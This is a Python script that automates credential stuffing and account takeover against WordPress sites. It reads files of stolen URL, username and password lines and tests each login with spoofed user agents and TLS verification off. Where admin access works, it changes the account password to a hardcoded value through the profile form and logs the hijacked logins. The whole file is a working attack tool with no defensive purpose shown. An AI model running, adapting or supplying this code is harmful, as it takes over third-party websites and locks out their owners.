import os
import sys
import asyncio
import httpx
from tqdm import tqdm
from urllib.parse import urlparse
from fake_useragent import UserAgent
from watchfiles import awatch, Change
from bs4 import BeautifulSoup
import re
import uuid

# ───────── CONFIG ─────────
DOWNLOADS_DIR = "../Filter/Wordpress-Filter"  # Monitor Wordpress-Filter directly
WORDPRESS_VALID = "../results-cms/Wordpress"
STATE_FILE = "../results-cms/Wordpress/processed_files.txt"
STABILITY_DELAY = 1  # seconds between checks
STABILITY_TRIES = 1  # how many times size must stay the same
MAX_CONCURRENT = 30
TIMEOUT = 15
VALID_WP_FILE = os.path.join(WORDPRESS_VALID, "WP_Valid.txt")
CHANGED_PASS_FILE = os.path.join(WORDPRESS_VALID, "WP_Changed_Pass.txt")
NEW_PASS = "ddfssdSMnizAeDX@1ssd"
ua = UserAgent()
wp_valid_count = 0
wp_invalid_count = 0
status_printed = False
processed_files = set()
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(WORDPRESS_VALID, exist_ok=True)

def HEADERS():
    return {
        "User-Agent": ua.random,
        "Referer": "",
        "Connection": "keep-alive"
    }

def update_status():
    global status_printed
    status_lines = [
        f"Valid Logins: {wp_valid_count}",
        f"Invalid Logins: {wp_invalid_count}"
    ]
    if status_printed:
        sys.stdout.write("\033[2A")
    else:
        status_printed = True
    for line in status_lines:
        sys.stdout.write(f"{line}\r\n")
    sys.stdout.flush()

def parse_wordpress_entry(line):
    try:
        match = re.match(r'^(https?://)?([a-zA-Z0-9.-]+)(?:/.*)?(/wp-login\.php|/wp-admin(?:/.*)?):([^:]+):(.+)$', line.strip())
        if not match:
            tqdm.write(f"[!] Bad entry format: {line.strip()}")
            return None
        scheme, host, path, username, password = match.groups()
        if not scheme:
            scheme = "https://"
        base_url = f"{scheme}{host}"
        parsed = urlparse(base_url)
        if not parsed.scheme or not parsed.hostname:
            return None
        login_url = f"{parsed.scheme}://{parsed.hostname}/wp-login.php"
        return {
            'login_url': login_url,
            'username': username,
            'password': password,
            'original': line.strip()
        }
    except Exception as e:
        tqdm.write(f"[!] Parse error: {line.strip()} - {str(e)}")
        return None

async def change_password_wordpress(base_url, oldpass, newpass, cookie, entry, host, username):
    change_url = f"{base_url}/wp-admin/profile.php"
    headers = HEADERS()
    headers["Referer"] = change_url
    headers["Origin"] = f"{base_url.split('/')[0]}//{base_url.split('/')[2]}"
    try:
        async with httpx.AsyncClient(timeout=TIMEOUT, verify=False) as client:
            resp = await client.get(change_url, headers=headers, cookies=cookie)
            if resp.status_code != 200:
                tqdm.write(f"[!] Failed to fetch profile.php for {entry} (Status {resp.status_code})")
                return False

            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='your-profile')
            if not form:
                tqdm.write(f"[!] Profile form not found for {entry}")
                return False

            action = form.get('action')
            if not action:
                tqdm.write(f"[!] Form action not found for {entry}")
                return False

            if action.startswith('/'):
                form_url = f"{base_url}{action}"
            else:
                form_url = action

            form_data = {}
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if not name:
                    continue
                value = input_tag.get('value', '')

                if name in ['pass1', 'pass2', 'pass1-text']:
                    value = newpass
                elif name == 'pw_weak':
                    value = '1'
                form_data[name] = value

            if 'action' not in form_data:
                form_data['action'] = 'update'
            if 'submit' not in form_data:
                form_data['submit'] = 'Update Profile'

            response = await client.post(form_url, data=form_data, headers=headers, cookies=cookie)
            response_text = response.text.lower()
            success_indicators = [
                "profile updated",
                "password changed",
                "notice is-dismissible updated",
                "user updated",
                "your profile has been updated"
            ]
            if any(indicator in response_text for indicator in success_indicators):
                with open(CHANGED_PASS_FILE, "a", encoding="utf-8", buffering=1) as cf:
                    cf.write(f"{base_url}/wp-login.php:{username}:{newpass}\n")
                    cf.flush()
                tqdm.write(f"[✓] Password changed for {entry}")
                return True
            else:
                tqdm.write(f"[!] Password change failed for {entry}: Response did not indicate success")
                return False
    except Exception as e:
        tqdm.write(f"[!] Change pass error for {entry}: {e}")
        return False

async def check_wordpress_login(parsed):
    global wp_valid_count, wp_invalid_count
    if not parsed:
        wp_invalid_count += 1
        update_status()
        return
    async with semaphore:
        entry = parsed['original']
        login_url = parsed['login_url']
        username = parsed['username']
        password = parsed['password']
        parsed_url = urlparse(login_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        host = parsed_url.hostname
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In"
        }
        headers = HEADERS()
        headers["Referer"] = login_url
        try:
            async with httpx.AsyncClient(timeout=TIMEOUT, verify=False, follow_redirects=False) as client:
                response = await client.post(login_url, data=data, headers=headers)
                if response.status_code != 200 and response.status_code != 302:
                    wp_invalid_count += 1
                    tqdm.write(f"[!] Login failed for {entry}: Status {response.status_code}")
                    update_status()
                    return
                cookie = {c.name: c.value for c in response.cookies.jar}
                dashboard_url = f"{base_url}/wp-admin/"
                dashboard_response = await client.get(dashboard_url, headers=headers, cookies=cookie)
                if "<a href='plugins.php'" in dashboard_response.text:
                    wp_valid_count += 1
                    output = f"{base_url}/wp-login.php:{username}:{NEW_PASS}"
                    with open(VALID_WP_FILE, "a", encoding="utf-8", buffering=1) as vf:
                        vf.write(f"{output}\n")
                        vf.flush()
                    success = await change_password_wordpress(base_url, password, NEW_PASS, cookie, entry, host, username)
                    if not success:
                        tqdm.write(f"[!] Password change failed for {entry}")
                else:
                    wp_invalid_count += 1
                    tqdm.write(f"[!] Login failed for {entry}: Dashboard access denied")
        except Exception as e:
            wp_invalid_count += 1
            tqdm.write(f"[!] Login error for {entry}: {e}")
        finally:
            update_status()

async def wait_until_stable(file_path: str) -> bool:
    """Wait until file stops growing."""
    prev_size = -1
    stable_count = 0
    while True:
        try:
            size = os.path.getsize(file_path)
        except FileNotFoundError:
            return False
        if size == prev_size:
            stable_count += 1
            if stable_count >= STABILITY_TRIES:
                return True
        else:
            stable_count = 0
            prev_size = size
        await asyncio.sleep(STABILITY_DELAY)

async def process_file(file_path: str):
    """Process lines from input file for WordPress login checking."""
    global wp_invalid_count
    try:
        stable = await wait_until_stable(file_path)
        if not stable:
            tqdm.write(f"[!] File {file_path} not stable or removed")
            return

        processed_lines = []
        with open(file_path, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.rsplit(":", 2)
                if len(parts) == 3:
                    url, username, password = parts
                    if not url.startswith(('http://', 'https://')):
                        url = f"https://{url}"
                        line = f"{url}:{username}:{password}"
                    processed_lines.append(line)
                else:
                    tqdm.write(f"[!] Skipped invalid line format: {line}")

        if processed_lines:
            tasks = []
            for line in processed_lines:
                parsed = parse_wordpress_entry(line)
                if parsed:
                    tasks.append(check_wordpress_login(parsed))
                else:
                    tqdm.write(f"[!] Failed to parse line for login: {line}")
                    wp_invalid_count += 1
            if tasks:
                await asyncio.gather(*tasks)
            tqdm.write(f"[+] Processed file: {file_path} ({len(processed_lines)} lines processed)")

        processed_files.add(file_path)

    except Exception as e:
        tqdm.write(f"[!] Error processing {file_path}: {e}")

async def watch_folder():
    global processed_files, semaphore
    processed_files = set()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            processed_files = set(line.strip() for line in f if line.strip())
    tqdm.write(f"👀 Watching folder: {DOWNLOADS_DIR}")
    async for changes in awatch(DOWNLOADS_DIR):
        for change, path in changes:
            if change == Change.added and os.path.isfile(path) and path not in processed_files and os.path.splitext(path)[1].lower() == '.txt':
                await process_file(path)
                with open(STATE_FILE, "a") as f:
                    f.write(f"{path}\n")

if __name__ == "__main__":
    try:
        for f in [VALID_WP_FILE, CHANGED_PASS_FILE]:
            open(f, 'a').close()
        asyncio.run(watch_folder())
    except KeyboardInterrupt:
        tqdm.write("\n🛑 Monitoring stopped")
    finally:
        tqdm.write("🔌 Shutdown complete")